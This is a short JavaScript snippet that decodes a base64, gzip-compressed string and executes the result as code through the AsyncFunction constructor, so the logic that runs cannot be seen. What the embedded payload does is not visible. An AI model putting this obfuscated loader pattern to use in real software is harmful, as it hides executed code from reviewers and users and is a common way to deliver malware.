const b64 = "H4sIAAAAAAAAEytKLSktylOoVshIzcnJt1IwNDLWUUhJTc7PLbBSKCkqTVWotQYARLSNaiQAAAA=";
const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
const ds = new DecompressionStream('gzip');
const stream = new Blob([bin]).stream().pipeThrough(ds);
const ab = await new Response(stream).arrayBuffer();
const code = new TextDecoder().decode(ab);
const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;
return await new AsyncFunction(code)();